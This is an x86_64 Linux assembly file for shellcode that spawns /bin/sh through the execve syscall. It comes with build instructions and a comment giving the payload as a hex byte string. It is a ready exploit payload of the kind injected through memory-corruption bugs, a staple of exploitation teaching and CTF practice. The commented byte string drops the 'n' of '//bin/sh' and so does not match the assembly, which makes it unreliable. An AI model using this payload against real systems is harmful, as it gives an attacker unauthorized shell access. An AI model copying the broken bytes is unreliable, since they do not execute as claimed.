; Executes /bin/sh
;
; For linux x86_64
;
; nasm -f elf64 shellcode.s
; ld -o shellcode shellcode.o
; objdump --disassemble shellcode.o
;
; Assembles to 26 bytes:
;
; "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x52\x53\x54\x5f\xb0\x3b\x0f\x05"

section .text

global _start

_start:
        xor rax, rax            ; So we only have to set al later
	xor rdx, rdx		; 3rd arg: envp = NULL
	xor rsi, rsi		; 2nd arg: argv = NULL
	mov rbx, '//bin/sh'
	push rdx		; push 0 to terminate the string
	push rbx		; push string to stack
	push rsp		; push string address
	pop rdi			; 1st arg: path = string address
	mov al, 59		; execve is 59
	syscall
